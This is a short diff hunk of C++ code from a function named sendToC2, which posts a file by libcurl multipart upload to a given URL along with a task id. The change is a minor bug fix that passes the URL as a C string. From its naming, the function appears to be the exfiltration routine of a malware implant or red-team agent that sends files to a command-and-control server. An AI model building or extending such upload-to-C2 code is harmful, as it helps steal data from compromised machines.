@@ -45,7 +45,7 @@ void sendToC2(string path, string url, string filename, string taskid) {
 	curl = curl_easy_init();
 	if (curl){
 		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-		curl_easy_setopt(curl, CURLOPT_URL, url);
+		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
 		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK)
